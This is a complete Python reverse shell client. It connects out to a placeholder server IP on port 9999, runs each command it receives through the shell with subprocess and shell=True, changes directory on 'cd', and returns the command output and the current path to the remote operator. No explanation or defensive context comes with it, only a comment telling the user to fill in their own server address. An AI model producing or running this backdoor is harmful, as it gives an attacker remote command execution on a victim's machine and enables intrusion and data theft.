import socket
import subprocess
import os

def main():
    s = socket.socket()
    host = "<server_IP_address>"  # Replace with your server's IP address
    port = 9999

    try:
        s.connect((host, port))
        while True:
            data = s.recv(1024)
            if not data:
                break  # Exit if connection is closed

            # Change directory command
            if data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))
            
            # Execute received command
            cmd = subprocess.Popen(data.decode("utf-8"), shell=True,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = output_bytes.decode("utf-8", errors="replace")
            current_directory = os.getcwd() + "> "
            s.send(output_str.encode() + current_directory.encode())
            
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    main()
